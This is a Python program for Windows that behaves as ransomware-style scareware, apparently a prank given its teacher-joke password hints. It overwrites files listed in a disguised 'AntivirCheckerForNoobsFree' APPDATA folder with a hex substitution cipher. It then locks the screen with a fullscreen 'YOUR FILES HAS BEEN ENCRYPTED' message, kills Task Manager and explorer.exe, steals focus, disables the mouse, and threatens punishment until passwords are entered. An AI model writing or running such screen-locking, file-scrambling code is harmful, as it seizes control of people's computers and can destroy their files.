import os
import subprocess
from random import randint
import pygame
import sys
import atexit
import ctypes
import ctypes.wintypes
from time import sleep
import threading
import time



def minimize_all_programs_builtin():
    """
    Minimize all windows using only Windows API (no external dependencies).
    """
    # Constants
    SW_MINIMIZE = 6
    WS_MINIMIZEBOX = 0x00020000
    
    # Define callback function type
    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    
    def enum_windows_proc(hwnd, lParam):
        """Callback for EnumWindows"""
        # Check if window is visible
        if ctypes.windll.user32.IsWindowVisible(hwnd):
            # Get window style
            style = ctypes.windll.user32.GetWindowLongW(hwnd, -16)  # GWL_STYLE
            # Check if window can be minimized
            if style & WS_MINIMIZEBOX:
                ctypes.windll.user32.ShowWindow(hwnd, SW_MINIMIZE)
        return True
    
    # Create callback and enumerate windows
    callback = WNDENUMPROC(enum_windows_proc)
    ctypes.windll.user32.EnumWindows(callback, 0)
    return True




def kill_task_manager_if_running():
    """Check if Task Manager is running and kill it if it is"""
    try:
        # Check if Taskmgr.exe is running
        result = subprocess.run(
            ['tasklist', '/FI', 'IMAGENAME eq Taskmgr.exe'],
            capture_output=True,
            text=True
        )
        
        # If Taskmgr.exe is found in the task list
        if 'Taskmgr.exe' in result.stdout:
            print("Task Manager is running, killing it...")
            subprocess.run(['taskkill', '/F', '/IM', 'Taskmgr.exe'], capture_output=True)
            return True
        else:
            print("Task Manager is not running")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

def keep_window_always_on_top(hwnd):
    """Continuously force window to stay on top using a background thread"""
    def enforce_on_top():
        HWND_TOPMOST = -1
        SWP_NOMOVE = 0x0002
        SWP_NOSIZE = 0x0001
        user32 = ctypes.windll.user32
        
        while True:
            try:
                user32.SetWindowPos(
                    hwnd,
                    HWND_TOPMOST,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE
                )
            except:
                pass
            time.sleep(0.1)  # Check every 100ms
    
    # Start the background thread
    thread = threading.Thread(target=enforce_on_top, daemon=True)
    thread.start()
    return thread

def force_window_focus(hwnd):
    """Force the window to gain focus and become active"""
    try:
        user32 = ctypes.windll.user32
        
        # Restore window if minimized
        user32.ShowWindow(hwnd, 9)  # SW_RESTORE = 9
        
        # Bring window to foreground
        user32.SetForegroundWindow(hwnd)
        
        # Set window to always on top again
        HWND_TOPMOST = -1
        SWP_NOMOVE = 0x0002
        SWP_NOSIZE = 0x0001
        user32.SetWindowPos(
            hwnd,
            HWND_TOPMOST,
            0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE
        )
        
        return True
    except Exception as e:
        print(f"Focus error: {e}")
        return False

def is_window_focused(hwnd):
    """Check if our window is currently focused"""
    try:
        user32 = ctypes.windll.user32
        foreground_hwnd = user32.GetForegroundWindow()
        return hwnd == foreground_hwnd
    except:
        return False

def monitor_and_steal_focus(hwnd):
    """Background thread that continuously checks if window has focus and steals it back if not"""
    def focus_stealer():
        user32 = ctypes.windll.user32
        
        while True:
            try:
                # Check if our window is in the foreground
                foreground_hwnd = user32.GetForegroundWindow()
                
                if hwnd != foreground_hwnd:
                    print("Window lost focus! Stealing it back...")
                    
                    # Restore window if minimized
                    user32.ShowWindow(hwnd, 9)  # SW_RESTORE = 9
                    
                    # Bring window to foreground
                    user32.SetForegroundWindow(hwnd)
                    
                    # Set window to always on top
                    HWND_TOPMOST = -1
                    SWP_NOMOVE = 0x0002
                    SWP_NOSIZE = 0x0001
                    user32.SetWindowPos(
                        hwnd,
                        HWND_TOPMOST,
                        0, 0, 0, 0,
                        SWP_NOMOVE | SWP_NOSIZE
                    )
                    
                    # Also try to minimize other windows to be safe
                    # This helps ensure our window is the only visible one
                    minimize_all_programs_builtin()
                    
                    # Small delay to let the window regain focus
                    time.sleep(0.05)
                    
                    # Force focus one more time
                    user32.SetForegroundWindow(hwnd)
                    
            except Exception as e:
                print(f"Focus monitor error: {e}")
            
            time.sleep(0.1)  # Check every 100ms
    
    # Start the focus stealing thread
    thread = threading.Thread(target=focus_stealer, daemon=True)
    thread.start()
    return thread

def prevent_alt_tab():
    """Try to prevent Alt+Tab from working"""
    try:
        # This is a more aggressive approach - hook into the system
        # Note: This might not work on all Windows versions
        import ctypes
        from ctypes import wintypes
        
        # Constants for low-level keyboard hook
        WH_KEYBOARD_LL = 13
        WM_KEYDOWN = 0x0100
        WM_SYSKEYDOWN = 0x0104
        VK_TAB = 0x09
        VK_LMENU = 0xA4  # Left Alt
        VK_RMENU = 0xA5  # Right Alt
        
        # Keyboard hook function - not implemented for simplicity
        # Full implementation would require a low-level hook
        print("Note: Full Alt+Tab prevention requires a system hook")
        print("Using focus stealing method instead...")
        return False
    except:
        return False

def create_restricted_window():

    minimize_all_programs_builtin()

    sleep(1)

    print("Pygame starting")
    pygame.init()
    screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
    
    # Hide mouse cursor
    pygame.mouse.set_visible(False)
    
    # Set up font for text display
    font = pygame.font.Font(None, 48)
    small_font = pygame.font.Font(None, 36)
    
    # Kill explorer to prevent Win+D, Win+M
    subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], capture_output=True)
    
    # Make sure explorer restarts when program exits
    atexit.register(lambda: subprocess.Popen(['explorer.exe']))
    
    if sys.platform == 'win32':
        import ctypes
        
        # Get window handle
        hwnd = pygame.display.get_wm_info()['window']
        user32 = ctypes.windll.user32
        
        # Windows API constants
        HWND_TOPMOST = -1
        SWP_NOMOVE = 0x0002
        SWP_NOSIZE = 0x0001
        SWP_SHOWWINDOW = 0x0040
        
        # Set window to always on top
        user32.SetWindowPos(
            hwnd,
            HWND_TOPMOST,
            0, 0, 0, 0,
            SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
        )
        
        # Start background thread to continuously enforce always-on-top
        enforce_thread = keep_window_always_on_top(hwnd)
        print("Always-on-top enforcement thread started")
        
        # Start focus stealing thread
        focus_thread = monitor_and_steal_focus(hwnd)
        print("Focus stealing thread started")
    
    allowed_keys = set(range(pygame.K_a, pygame.K_z + 1))
    allowed_keys.update([pygame.K_RETURN, pygame.K_KP_ENTER])
    
    input_text = ""
    session = 0
    max_sessions = 4  # Sessions 0, 1, 2, 3
    
    # Passwords for each session
    passwords = {
        0: "fecdcfebfceb",
        1: "zengynahrad",
        2: "macek",
        3: "nose"
    }

    hits = {
        0: "The password is fecdcfebfceb",
        1: "The password is 122 101 110 103 121 110 97 104 114 97 100",
        2: "Who is the best teacher ever?",
        3: "The best word we all know that starts with n"
    }
    
    running = True
    while running:
        kill_task_manager_if_running()
        
        # Continuously force window to stay on top and focused in the main loop too
        if sys.platform == 'win32':
            try:
                # Force window to stay on top
                user32.SetWindowPos(
                    hwnd,
                    HWND_TOPMOST,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE
                )
                
                # Check if we have focus, if not steal it
                foreground_hwnd = user32.GetForegroundWindow()
                if hwnd != foreground_hwnd:
                    # Restore window
                    user32.ShowWindow(hwnd, 9)  # SW_RESTORE
                    # Set foreground
                    user32.SetForegroundWindow(hwnd)
                    # Minimize all windows again
                    minimize_all_programs_builtin()
                    
            except:
                pass
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                continue
            elif event.type == pygame.KEYDOWN:
                if event.key in allowed_keys:
                    if event.key in (pygame.K_RETURN, pygame.K_KP_ENTER):
                        # Check password for current session
                        if input_text.lower() == passwords[session]:
                            print(f"Session {session} password correct!")
                            if session < max_sessions - 1:
                                session += 1
                                print(f"Moving to session {session}")
                            else:
                                print("All sessions complete! Exiting...")
                                running = False
                        else:
                            print(f"Wrong password for session {session}")
                        input_text = ""
                    else:
                        char = chr(event.key).upper() if event.mod & pygame.KMOD_SHIFT else chr(event.key)
                        input_text += char
                        print(f"Key: {char}")
                elif event.key == pygame.K_q and event.mod & pygame.KMOD_CTRL and event.mod & pygame.KMOD_SHIFT:
                    running = False
            # Ignore all mouse events
            elif event.type in (pygame.MOUSEMOTION, pygame.MOUSEBUTTONDOWN, pygame.MOUSEBUTTONUP, pygame.MOUSEWHEEL):
                pass
        
        # Disable mouse by warping it to corner
        pygame.mouse.set_pos(0, 0)
        
        # Draw everything
        screen.fill((0, 0, 0))
        
        # Draw session level
        
        # Draw progress bar
        bar_width = 300
        bar_height = 20
        bar_x = screen.get_width() // 2 - bar_width // 2
        bar_y = screen.get_height() // 2 - 80
        

        
        # Progress text
        progress_text = small_font.render(f"level {session + 1}/{max_sessions}", True, (255, 255, 255))
        progress_rect = progress_text.get_rect(center=(screen.get_width() // 2, bar_y - 20))
        screen.blit(progress_text, progress_rect)
        
        # Draw title text
        title_text = font.render("YOUR FILES HAS BEEN ENCRYPTED", True, (255, 0, 0))
        title_rect = title_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2 - 40))
        screen.blit(title_text, title_rect)
        
        # Draw instruction text
        instruction_text = small_font.render(hits[session], True, (255, 255, 255))
        instruction_rect = instruction_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2))
        screen.blit(instruction_text, instruction_rect)
        
        # Draw input text (shown as asterisks)
        masked_text = "*" * len(input_text)
        input_display = small_font.render(f"Password: {masked_text}", True, (0, 255, 0))
        input_rect = input_display.get_rect(center=(screen.get_width() // 2, screen.get_height() // 2 + 60))
        screen.blit(input_display, input_rect)

        warning_text = small_font.render(f"Warning: any action besides trying to decrypt your files WILL BE PUNISHED!", True, (200, 200, 200))
        warning_rect = warning_text.get_rect(center=(screen.get_width() // 2, screen.get_height() // 4 * 3))
        screen.blit(warning_text, warning_rect)

        pygame.display.flip()
    
    pygame.quit()
    print("Pygame end")

print("paths checking")
path_check_state = os.path.join(os.environ["APPDATA"], "AntivirCheckerForNoobsFree", "state.txt")

path_to_paths = os.path.join(os.environ["APPDATA"], "AntivirCheckerForNoobsFree", "just_a_normal_log.log")

with open(path_to_paths, "r") as f:
    paths = [line.strip() for line in f.readlines()]



path_to_key = os.path.join(os.environ["APPDATA"], "AntivirCheckerForNoobsFree", "tohle_neni_key.bin")

with open(path_check_state, "r", encoding="utf-8", errors="ignore") as f:
    state = f.read().strip()



def ascii_to_char(value):
    """
    Convert a single ASCII integer to its character string.
    
    Args:
        value (int): ASCII code (0–127 standard ASCII, 0–255 extended)
    
    Returns:
        str: Single-character string.
    
    Raises:
        TypeError: If value is not an integer.
        ValueError: If value is outside valid byte range.
    """
    # Validate type
    if not isinstance(value, int):
        raise TypeError("ASCII value must be an integer.")
    
    # Validate range (0–255 covers ASCII + extended)
    if value < 0 or value > 255:
        raise ValueError("ASCII value must be between 0 and 255.")
    
    try:
        return chr(value)
    except Exception as e:
        # chr() can still fail on some invalid inputs
        raise ValueError(f"Cannot convert value {value}: {e}")

key = ""

"""
fdsjklfdsfdsjklfds
fdsjklfdsfdsjklfds
fdsjkl------jklfds
fdsjkl-#<>#-jklfds
fdsjkl------jklfds
fdsjklfdsfdsjklfds
fdsjklfdsfdsjklfds
"""


def get_all_files(folder_path: str) -> list:
    """
    Vrátí seznam všech souborů (absolutní cesty) ve složce a všech podsložkách.
    
    Args:
        folder_path: Cesta ke složce
        
    Returns:
        Seznam cest k souborům jako řetězce
    """
    files = []
    
    # os.walk prochází rekurzivně strom složek
    for root, dirs, filenames in os.walk(folder_path):
        for filename in filenames:
            # Složíme úplnou cestu k souboru
            full_path = os.path.join(root, filename)
            files.append(full_path)
    
    return files





def kill_explorer():
    """Kill explorer.exe process"""
    try:
        # Method 1: Using taskkill
        subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], 
                      capture_output=True)
        print("Explorer killed")
        
    except Exception as e:
        print(f"Error: {e}")

def restart_explorer():
    """Restart explorer.exe"""
    try:
        subprocess.Popen(['explorer.exe'])
        print("Explorer restarted")
    except Exception as e:
        print(f"Error: {e}")





def generate_key(filename):
    chars = []
    for i in range(97, 123):
        chars.append(ascii_to_char(i))
    for i in range(0, 6):
        chars.append(i)

    key = ""
    for i in range(32):
        index = randint(0, len(chars) - 1)
        key += str(chars[index])
        chars.pop(index)
    with open(filename, "w") as f:
        f.write(key)
    print(f"key: {key}")
    return key
    
def bytes_to_hex(byte_data):
    """
    Convert bytes to a hexadecimal string representation.
    
    Args:
        byte_data (bytes): The input byte data to convert.
    
    Returns:
        str: Hexadecimal string representation of the byte data.
    """
    if not isinstance(byte_data, bytes):
        raise TypeError("Input must be of type 'bytes'.")
    
    return byte_data.hex()

def hex_to_bytes(hex_string):
    """
    Convert a hexadecimal string to bytes.
    
    Args:
        hex_string (str): The input hexadecimal string.
    
    Returns:
        bytes: The corresponding byte data.
    
    Raises:
        ValueError: If the input string is not a valid hexadecimal string.
    """
    if not isinstance(hex_string, str):
        raise TypeError("Input must be of type 'str'.")
    
    try:
        return bytes.fromhex(hex_string)
    except ValueError as e:
        raise ValueError(f"Invalid hexadecimal string: {e}")


def permutation_in(text, key):
    # Take every second character from the key
    key_chars = key[::2]

    hex_chars = "abcdef0123456789"


    result = ""

    for i in text:
        result += key_chars[hex_chars.index(i)]
    return result


def permutation_out(text, key):
    key_chars = key[::2]

    hex_chars = "abcdef0123456789"

    result = ""

    for i in text:
        result += hex_chars[key_chars.index(i)]
    return result

                




def encrypt(file_path, key):
    print(f"Encrypting: {file_path}")
    global path_check_state
    with open(file_path, "rb") as f:
        data = f.read()
    in_hex = bytes_to_hex(data)
    permutated = permutation_in(in_hex, key)
    with open(file_path, "w") as f:
        f.write(permutated)

    with open(path_check_state, "w") as f:
        f.write("dec")


def decrypt(file_path, key):
    print(f"Decrypting: {file_path}")
    global path_check_state
    with open(file_path, "r") as f:
        permutated = f.read()
        hex_data = permutation_out(permutated, key)
    data = hex_to_bytes(hex_data)
    with open(file_path, "wb") as f:
        f.write(data)
    with open(path_check_state, "w") as f:
        f.write("enc")

if state == "enc":
    print("Main - enc selected")
    key = generate_key(path_to_key)
    for path in paths:
        encrypt(path, key)
    create_restricted_window()
    with open(path_to_key, "r") as f:
        key = f.read()
    for path in paths:
        decrypt(path, key)

elif state == "dec":
    print("Main - dec selected")
    with open(path_to_key, "r") as f:
        key = f.read()
    for path in paths:
        decrypt(path, key)